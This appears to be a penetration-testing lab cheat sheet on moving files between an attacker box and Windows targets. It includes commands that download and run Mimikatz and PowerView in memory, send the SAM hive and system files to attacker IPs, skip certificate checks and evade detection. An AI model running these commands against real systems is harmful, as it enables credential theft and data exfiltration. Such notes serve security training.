# Attack to Target
## PowerShell Base64 Encode & Decode
### Pwnbox Check SSH Key MD5 Hash
- `COR33@htb[/htb]$ md5sum id_rsa`

### Pwnbox Encode SSH Key to Base64
- `cat id_rsa |base64 -w 0;echo`

-`[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String(""))`

### Confirming the MD5 Hashes Match
- `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5`

## PowerShell Web Downloads
Method 	Description
OpenRead 	Returns the data from a resource as a Stream.
OpenReadAsync 	Returns the data from a resource without blocking the calling thread.
DownloadData 	Downloads data from a resource and returns a Byte array.
DownloadDataAsync 	Downloads data from a resource and returns a Byte array without blocking the calling thread.
DownloadFile 	Downloads data from a resource to a local file.
DownloadFileAsync 	Downloads data from a resource to a local file without blocking the calling thread.
DownloadString 	Downloads a String from a resource and returns a String.
DownloadStringAsync 	Downloads a String from a resource without blocking the calling thread.

### File Download
- `(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')`

- `(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')`

### PowerShell DownloadString - Fileless Method
- `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`

- `(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX`

### PowerShell Invoke-WebRequest
iwr, curl, and wget instead of the Invoke-WebRequest full name.
- `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`

### Common Errors with PowerShell
There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download..
This can be bypassed using the parameter -UseBasicParsing.

- `Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX`

Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

- `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`

## SMB Downloads
### Create the SMB Server
We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with smbserver.py from Impacket and then use copy, move, PowerShell Copy-Item, or any other tool that allows connection to SMB.

- `sudo impacket-smbserver share -smb2support /tmp/smbshare`

### Copy a File from the SMB Server
- `copy \\192.168.220.133\share\nc.exe`

### Create the SMB Server with a Username and Password
- `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`

### Mount the SMB Server with Username and Password
- `net use n: \\192.168.220.133\share /user:test test`

## FTP Downloads
### Setting up a Python3 FTP Server
- `sudo python3 -m pyftpdlib --port 21`

### Transfering Files from an FTP Server Using PowerShell
- `(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`

# Target to Attack
## PowerShell Base64 Encode & Decode
### Encode File Using PowerShell
- `[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))`
- `Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash`

### Decode Base64 String in Linux 
- `echo = | base64 -d > hosts`
- `md5sum hosts `

## PowerShell Web Uploads
### Installing a Configured WebServer with Upload
- `pip3 install uploadserver`
- `python3 -m uploadserver`

#### PowerShell Script to Upload a File to Python Upload Server
- `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')`
- `Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts`

## PowerShell Base64 Web Upload
- `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))`
- `Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64`

- `nc -lvnp 8000`

- `echo <base64> | base64 -d -w 0 > hosts`

## SMB Uploads
### Using the WebDav Python module
- `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`

### Connecting to the Webdav Share
- `dir \\192.168.49.128\DavWWWRoot`

### Uploading Files using SMB
- `copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\`

### Creating a Share with smbserver.py
- `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/`

#### Upload to Attack 
- `move sam.save \\10.10.15.16\CompData`

## FTP Uploads
- `sudo python3 -m pyftpdlib --port 21 --write`

### PowerShell Upload File
- `(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`

# Transferring Files with Code
## JavaScript
```js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

### Download a File Using JavaScript and cscript.exe
- `cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1`

## VBScript
```vb
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

### Download a File Using VBScript and cscript.exe
- `cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1`

# Miscellaneous File Transfer Methods
## From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.
- `Test-NetConnection -ComputerName DATABASE01 -Port 5985`

## Create a PowerShell Remoting Session to DATABASE01
- `$Session = New-PSSession -ComputerName DATABASE01`

## Copy samplefile.txt from our Localhost to the DATABASE01 Session
- `Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\`

## Copy DATABASE.txt from DATABASE01 Session to our Localhost
- `Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session`

## RDP
### Mounting a Linux Folder Using rdesktop
- `rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'`

### Mounting a Linux Folder Using xfreerdp
- `xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@'`
To access the directory, we can connect to \\tsclient\, allowing us to transfer files to and from the RDP session.

# Protected File Transfers
## File Encryption on Windows
### Invoke-AESEncryption.ps1
```ps1
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 

Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
 
Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
 
Description
-----------
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
 
Description
-----------
Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
```

### Import Module Invoke-AESEncryption.ps1
- `Import-Module .\Invoke-AESEncryption.ps1`

### File Encryption Example
- `Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt`

# Living off The Land
## Upload win.ini to our Pwnbox
- `certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini`

## File Received in our Netcat Session
- `sudo nc -lvnp 80`

# Evading Detection
## Request with Chrome User Agent
```
UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
## LOLBAS / GTFOBins
### Transferring File with GfxDownloadWrapper.exe
- `GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"`
